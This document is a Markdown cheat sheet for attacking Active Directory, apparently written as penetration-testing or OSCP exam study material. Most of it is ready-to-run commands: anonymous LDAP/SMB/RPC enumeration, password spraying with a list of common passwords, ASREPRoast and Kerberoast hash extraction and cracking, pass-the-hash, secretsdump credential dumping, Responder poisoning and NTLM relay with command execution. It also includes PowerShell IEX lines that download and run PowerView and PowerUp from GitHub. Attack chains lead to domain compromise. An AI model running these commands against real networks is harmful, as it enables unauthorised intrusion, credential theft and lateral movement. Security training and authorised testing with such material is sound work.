# Active Directory Enumeration

## Test SMB anonymous access with NetExec
```bash
# -u '' for null session OR -u 'guest' for guest account
netexec smb $IP -u '' -p '' --shares
```

## Test LDAP anonymous access with NetExec
```bash
# -u '' for null session OR -u 'guest' for guest account
netexec ldap $IP -u '' -p '' --users --groups
```

## Test WinRM/RDP anonymous access with NetExec
```bash
# Change protocol: winrm OR rdp
netexec winrm $IP -u '' -p ''
```

## Perform anonymous LDAP enumeration
```bash
# Add filter like "(objectClass=*)" for all objects
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local"
```

## Extract user accounts from LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
```

## Extract computer accounts from LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d: -f2 | sort > computers.txt
```

## Extract groups from LDAP
```bash
ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=group)" cn | grep "cn:" | cut -d: -f2
```

## Enumerate DNS subdomains
```bash
gobuster dns -d domain.com -t 25 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Enumerate domain with enum4linux-ng
```bash
# Add -A flag for comprehensive enumeration
enum4linux-ng $IP
```

## Connect to RPC with null session
```bash
# Add -N flag to suppress password prompt
rpcclient -U "" $IP
```

## Enumerate domain users via RPC
```bash
rpcclient -U "" -N $IP -c "enumdomusers"
```

## Enumerate domain groups via RPC
```bash
rpcclient -U "" -N $IP -c "enumdomgroups"
```

## Get domain information via RPC
```bash
rpcclient -U "" -N $IP -c "querydominfo"
```

## Identify domain controllers with nmap
```bash
nmap -p 88,389,636,3268,3269 $IP
```

## Reverse DNS lookup for domain name
```bash
# nslookup OR dig -x
nslookup $IP
```

## NetBIOS name discovery
```bash
# nbtscan OR nmblookup -A
nbtscan $IP
```

## Enumerate with authenticated NetExec LDAP
```bash
# Add --password-policy, --users, --groups, --computers as needed
netexec ldap $IP -u username -p password --users --groups --computers
```

## Enumerate SMB shares with credentials
```bash
# netexec (faster) OR smbclient -L for interactive
netexec smb $IP -u username -p password --shares
```

## Password spraying with NetExec
```bash
# -p 'Password123!' for single password OR -p passwords.txt for file
# Change protocol: smb, ldap, OR winrm
netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```

## ASREPRoast attack without credentials
```bash
# Add -format hashcat for hashcat-compatible output
impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
```

## Hashcat ASREPRoast
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Kerberoast attack with credentials
```bash
# impacket: add -outputfile kerb_hashes.txt OR netexec for automation
impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
```

## Crack Kerberoast hashes with hashcat
```bash
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Collect BloodHound data with bloodhound-python
```bash
# Add -ns $IP if DNS resolution issues
bloodhound-python -d domain.local -u username -p password -gc $IP -c all
```

## Run SharpHound on Windows target
```cmd
# Add -d domain.local OR --zipfilename output.zip as needed
.\SharpHound.exe -c All
```

## Download PowerView for AD enumeration
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

## Get domain information with PowerView
```powershell
Get-Domain
Get-DomainController
Get-DomainPolicy
```

## Enumerate domain users with PowerView
```powershell
Get-DomainUser
Get-DomainUser -Identity administrator
Get-DomainUser | Select-Object samaccountname,description
```

## Enumerate domain groups with PowerView
```powershell
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
```

## Enumerate domain computers with PowerView
```powershell
Get-DomainComputer
Get-DomainComputer | Select-Object name,operatingsystem
```

## Find domain shares with PowerView
```powershell
Find-DomainShare
Find-DomainShare -CheckShareAccess
```

## Download PowerUp for privilege escalation
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks
```

## Test WinRM access
```bash
# evil-winrm for shell OR netexec for quick validation
evil-winrm -i $IP -u username -p password
```

## Pass-the-hash with NetExec
```bash
# Change protocol: smb OR winrm
netexec smb $IP -u username -H ntlmhash
```

## Dump domain hashes with impacket-secretsdump
```bash
# Add -just-dc for DC hashes only OR -just-dc-ntlm for NTLM only
impacket-secretsdump domain.local/username:password@$IP
```

## Check for MS17-010 EternalBlue vulnerability
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

## Check for SMB signing with NetExec
```bash
netexec smb $IP --gen-relay-list relay_targets.txt
```

## Enumerate with ldapdomaindump
```bash
ldapdomaindump -u 'domain.local\username' -p password $IP
```

## Get domain password policy via NetExec
```bash
# Use smb with --pass-pol OR ldap with --password-policy
netexec smb $IP -u username -p password --pass-pol
```

## Enumerate domain trusts with PowerView
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

## Find computers with unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained
```

## Find users with SPN set for Kerberoasting
```powershell
Get-DomainUser -SPN
```

## Enumerate Group Policy Objects with PowerView
```powershell
Get-DomainGPO
Get-DomainGPO | Select-Object displayname,gpcfilesyspath
```

## Find local admin access with PowerView
```powershell
Find-LocalAdminAccess
Test-AdminAccess
```

## Enumerate logged on users with PowerView
```powershell
Get-NetLoggedon -ComputerName DC01
Get-NetSession -ComputerName DC01
```

## Check for LLMNR/NBT-NS poisoning opportunities
```bash
responder -I eth0 -A
```

## Run Responder for credential capture
```bash
responder -I eth0 -wrf
```

## Setup ntlmrelayx for SMB relay attacks
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

---

## Methodology

### Initial Enumeration Strategy
Start with anonymous/null session access before attempting authenticated enumeration:

**Phase 1 - Anonymous Discovery:**
1. Test null sessions on LDAP, SMB, RPC
2. Extract user lists from any accessible service
3. Compile comprehensive username list
4. Identify domain controllers and infrastructure

**Phase 2 - Credential Acquisition:**
1. ASREPRoast discovered users (no credentials needed)
2. Password spraying with common passwords
3. Responder/LLMNR poisoning (if on internal network)
4. Check for default credentials

**Phase 3 - Authenticated Enumeration:**
1. Run BloodHound collection immediately
2. Kerberoast service accounts
3. Enumerate shares and sensitive files
4. Map attack paths with BloodHound

### Service Enumeration Priority

**LDAP (389/636) - Highest Priority:**
- Often allows anonymous binding
- Returns comprehensive user/computer/group lists
- Extract all domain objects for further attacks

**SMB (139/445) - High Priority:**
- Test null sessions for share enumeration
- Look for readable shares with sensitive data
- Check SMB signing status for relay attacks

**RPC (135) - Medium Priority:**
- Sometimes allows null authentication
- Can enumerate users and groups
- Use rpcclient for manual queries

**Kerberos (88) - Authentication Required:**
- ASREPRoasting (works without credentials)
- Kerberoasting (requires valid credentials)
- Golden ticket attacks (requires krbtgt hash)

**WinRM (5985/5986) - Shell Access:**
- Test discovered credentials
- Preferred for remote shell access
- Works with pass-the-hash attacks

### Tools Selection Guide

**For Anonymous Enumeration:**
- ldapsearch (LDAP queries)
- enum4linux-ng (comprehensive SMB/RPC/LDAP)
- rpcclient (manual RPC queries)
- NetExec with null credentials

**For Authenticated Enumeration:**
- BloodHound/SharpHound (attack path analysis)
- PowerView (Windows-side enumeration)
- NetExec (multi-protocol testing)
- Impacket suite (Python-based attacks)

**For Credential Attacks:**
- impacket-GetNPUsers (ASREPRoasting)
- impacket-GetUserSPNs (Kerberoasting)
- NetExec (password spraying)
- hashcat (hash cracking)

### Common Password Spraying Wordlist
Create a file with these common AD passwords:
- Password123!
- Welcome123!
- Summer2024!
- Spring2024!
- CompanyName2024!
- Month+Year combinations

### BloodHound Analysis Focus Areas

**Shortest Paths to Look For:**
- Shortest path to Domain Admins
- Shortest path to High Value Targets
- Users with DCSync rights
- Computers with unconstrained delegation
- Kerberoastable users with admin access
- Users with GenericAll/WriteDacl on sensitive objects

### NetExec vs Impacket

**Use NetExec for:**
- Password spraying across multiple hosts
- Quick credential validation
- Network-wide enumeration
- Generating relay target lists

**Use Impacket for:**
- Targeted attacks on specific hosts
- ASREPRoasting and Kerberoasting
- Secretsdump for credential extraction
- Golden/Silver ticket creation

### Common AD Attack Chains

**Chain 1: Anonymous LDAP -> ASREPRoast -> WinRM**
1. Anonymous LDAP enumeration for users
2. ASREPRoast to get user hashes
3. Crack hashes and login via WinRM

**Chain 2: Null SMB -> Password Spray -> Kerberoast**
1. Null SMB session for user enumeration
2. Password spray with common passwords
3. Kerberoast service accounts
4. Crack service account hashes for privilege escalation

**Chain 3: Responder -> Relay -> Local Admin**
1. Capture credentials with Responder
2. Relay to targets without SMB signing
3. Gain local admin access
4. Extract credentials for lateral movement

### Time Management

**First 15 Minutes:**
- Test anonymous LDAP/SMB/RPC access
- Extract all available user lists
- Start ASREPRoast attack

**Next 15 Minutes:**
- Password spraying with top 5 passwords
- Run BloodHound if credentials obtained
- Start Kerberoast if authenticated

**Ongoing:**
- Hash cracking in background
- BloodHound path analysis
- Lateral movement testing

### Resources
- BloodHound CE: https://github.com/SpecterOps/BloodHound
- BloodHound Usage: https://bloodhound.readthedocs.io/
- PowerView Documentation: https://powersploit.readthedocs.io/
- Impacket Examples: https://github.com/SecureAuthCorp/impacket/tree/master/examples
- NetExec Wiki: https://www.netexec.wiki/
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- BloodHound Attack Paths: https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
- OSCP Secret Sauce: https://eins.li/posts/oscp-secret-sauce/
